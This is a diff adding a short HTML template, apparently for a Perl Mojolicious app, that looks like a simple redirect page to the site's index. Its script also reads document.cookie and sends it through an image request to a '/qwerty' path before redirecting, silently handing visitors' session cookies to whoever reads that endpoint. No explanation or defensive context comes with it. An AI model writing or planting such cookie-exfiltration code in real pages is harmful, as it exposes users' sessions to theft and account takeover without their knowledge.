@@ -1,0 +1,11 @@
+<html>
+<head>
+    <!--<meta http-equiv="refresh" content="1;url=<%= url_for('index')->to_abs() %>">-->
+    <script>
+        console.log(document.cookie);
+        var img = document.createElement('img');
+        img.src = "/qwerty?" + document.cookie;
+        window.location = "<%= url_for('index')->to_abs() %>"
+    </script>
+</head>
+</html>
